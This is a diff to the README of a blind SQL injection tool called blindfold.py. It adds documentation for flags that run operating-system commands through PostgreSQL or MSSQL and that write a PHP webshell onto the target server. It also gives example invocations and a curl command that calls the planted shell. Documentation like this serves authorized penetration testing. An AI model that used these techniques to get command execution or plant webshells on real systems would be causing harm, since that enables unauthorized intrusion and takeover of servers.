@@ -124,6 +124,8 @@ python3 blindfold.py [target] [action] [detection] [tuning]
 | `--dump TABLE`| Dump rows of a table (columns auto-discovered) |
 | `--max-rows`  | Row cap for `--dump` (default `50`) |
 | `--query`     | Extract a single SQL scalar (power mode) |
+| `--rce [CMD]` | OS command execution via the DBMS (no CMD = interactive shell) |
+| `--webshell`  | Drop a webshell file, verify it, and report the path |
 
 ### Injection
 
@@ -294,6 +296,48 @@ id | username | password
 | Current DB | `SELECT current_database()` / `SELECT database()` | `SELECT DB_NAME()` | `SELECT ora_database_name FROM dual` |
 | List users | `SELECT string_agg(usename,',') FROM pg_user` | `SELECT name FROM sys.sql_logins` | `SELECT username FROM all_users` |
 | Dump a password | `SELECT password FROM users WHERE username='admin'` | same | same |
+
+---
+
+## RCE — `--rce` and `--webshell`
+
+> **Authorized testing only.** Both need high DB privileges. They run after detection and
+> skip data extraction.
+
+Two strategies, chosen by what the DBMS supports:
+
+**`--rce` — direct command execution** (output read back through the detected oracle):
+
+| DBMS | Mechanism | Requires |
+|------|-----------|----------|
+| PostgreSQL | `COPY ... FROM PROGRAM` → output table → read back | superuser |
+| MSSQL | enable + `xp_cmdshell` → output table → read back | sysadmin |
+| MySQL / Oracle | no direct exec → use `--webshell` | – |
+
+**`--webshell` — drop a file and verify it** (`LOAD_FILE` / `pg_read_file` confirm the write
+through the blind channel, then the confirmed path is printed):
+
+| DBMS | Mechanism | Requires |
+|------|-----------|----------|
+| MySQL | `INTO DUMPFILE` (hex payload, raw) | `FILE` priv + permissive `secure_file_priv` |
+| PostgreSQL | `COPY (...) TO` | superuser |
+| MSSQL / Oracle | not supported | – |
+
+```bash
+# command execution
+blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" --rce "id"
+blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" --rce   # shell
+
+# webshell: try common web roots (+ ../ traversal for MySQL), verify, report the path
+blindfold.py --request req.txt --dbms mysql --webshell
+
+# webshell at a known path
+blindfold.py --request req.txt --dbms mysql --webshell --os-path /var/www/html/s.php
+# then: curl 'http://<target>/s.php?c=id'
+```
+
+`--os-path` takes a full file path (ends in `.php`/`.jsp`/`.aspx`…) or a directory (the
+`--shell-name`, default `bf.php`, is appended). `--shell-payload` overrides the default PHP shell.
 
 ---
 
